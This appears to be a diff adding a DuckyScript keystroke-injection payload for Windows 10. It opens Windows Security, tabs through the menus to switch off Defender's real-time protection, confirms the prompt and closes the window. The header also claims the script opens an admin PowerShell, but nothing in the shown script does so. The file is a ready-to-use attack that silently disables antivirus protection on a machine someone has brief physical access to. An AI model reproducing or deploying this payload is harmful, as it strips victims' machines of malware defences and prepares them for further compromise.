@@ -1,0 +1,47 @@
+REM Author      : https://github.com/Lizard640
+REM Description : Disable Windows Defender on Windows 10 And opens powershell admin rights
+
+DELAY 1000
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows security
+DELAY 1000
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 250
+DOWNARROW
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+ENTER
+DELAY 250
+SPACE
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+ENTER
+DELAY 250
+ALT F4
